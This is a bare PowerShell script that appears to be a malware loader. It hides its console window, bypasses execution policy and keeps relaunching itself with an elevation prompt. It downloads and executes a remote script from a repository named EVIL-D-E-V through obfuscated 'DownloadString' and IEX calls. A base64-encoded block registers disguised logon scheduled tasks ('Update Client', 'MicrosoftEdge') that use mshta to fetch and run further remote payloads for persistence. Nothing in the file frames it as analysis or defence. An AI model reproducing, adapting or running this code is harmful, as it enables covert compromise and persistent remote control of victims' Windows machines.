Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@

[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

Set-ExecutionPolicy Bypass -Scope Process -Force
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    while(1) {
        try {
            $code = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/download.ps1")
            $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
            Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
            exit;
        } catch {}
    }
}

iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("JGhpZGRlbnN0YXJ0dXAgPSAiVXBkYXRlIENsaWVudCIKJHRhc2tfYWN0aW9uID0gTmV3LVNjaGVkdWxlZFRhc2tBY3Rpb24gLUV4ZWN1dGUgIm1zaHRhLmV4ZSIgLUFyZ3VtZW50ICJ2YnNjcmlwdDpjcmVhdGVvYmplY3QoYCJ3c2NyaXB0LnNoZWxsYCIpLnJ1bihgInBvd2Vyc2hlbGwgYGl3cignaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VWSUwtRC1FLVYvTS9yZWZzL2hlYWRzL21haW4vZG93bmxvYWQucHMxJyl8aWV4YCIsMCkod2luZG93LmNsb3NlKSIKJHRhc2tfdHJpZ2dlciA9IE5ldy1TY2hlZHVsZWRUYXNrVHJpZ2dlciAtQXRMb2dPbgokdGFza19zZXR0aW5ncyA9IE5ldy1TY2hlZHVsZWRUYXNrU2V0dGluZ3NTZXQgLUFsbG93U3RhcnRJZk9uQmF0dGVyaWVzIC1Eb250U3RvcElmR29pbmdPbkJhdHRlcmllcyAtUnVuT25seUlmTmV0d29ya0F2YWlsYWJsZSAtRG9udFN0b3BPbklkbGVFbmQgLVN0YXJ0V2hlbkF2YWlsYWJsZQpSZWdpc3Rlci1TY2hlZHVsZWRUYXNrIC1BY3Rpb24gJHRhc2tfYWN0aW9uIC1UcmlnZ2VyICR0YXNrX3RyaWdnZXIgLVNldHRpbmdzICR0YXNrX3NldHRpbmdzIC1UYXNrTmFtZSAkdGFza19uYW1lIC1EZXNjcmlwdGlvbiAiVXBkYXRlIENsaWVudCIgLVJ1bkxldmVsIEhpZ2hlc3QgLUZvcmNlCldyaXRlLUhvc3QgIlshXSBQZXJzaXN0ZW5jZSBBZGRlZCIgLUZvcmVncm91bmRDb2xvciBHcmVlbgoKJHRhc2tfbmFtZSA9ICJNaWNyb3NvZnRFZGdlIgokdGFza19hY3Rpb24gPSBOZXctU2NoZWR1bGVkVGFza0FjdGlvbiAtRXhlY3V0ZSAibXNodGEuZXhlIiAtQXJndW1lbnQgInZic2NyaXB0OmNy"+"ZWF0Z"+"W9iamVjdChgIndzY3JpcHQuc2hlbGxgIikucnVuKGAicG93ZXJzaGVsbCBgaXdyKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNDNhMTcyMy90ZXN0L21haW4vZG93bmxvYWQucHMxJyl8aWV4YCIsMCkod2luZG93LmNsb3NlKSIKJHRhc2tfdHJpZ2dlciA9IE5ldy1TY2hlZHVsZWRUYXNrVHJpZ2dlciAtQXRMb2dPbgokdGFza19zZXR0aW5ncyA9IE5ldy1TY2hlZHVsZWRUYXNrU2V0dGluZ3NTZXQgLUFsbG93U3RhcnRJZk9uQmF0dGVyaWVzIC1Eb250U3RvcElmR29pbmdPbkJhdHRlcmllcyAtUnVuT25seUlmTmV0d29ya0F2YWlsYWJsZSAtRG9udFN0b3BPbklkbGVFbmQgLVN0YXJ0V2hlbkF2YWlsYWJsZQpSZWdpc3Rlci1TY2hlZHVsZWRUYXNrIC1BY3Rpb24gJHRhc2tfYWN0aW9uIC1UcmlnZ2VyICR0YXNrX3RyaWdnZXIgLVNldHRpbmdzICR0YXNrX3NldHRpbmdzIC1UYXNr"+"TmFtZSAkdGFza19uYW1l"+"IC1EZXNjcmlwdGlvbiAid2luZG93cyBzdGFydHVwIGZpbGUiIC1SdW5MZXZlbCBIaWdoZXN0IC1Gb3JjZQpXcml0ZS1Ib3N0ICJbIV0gUGVyc2lzdGVuY2UgQWRkZWQiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4=")))
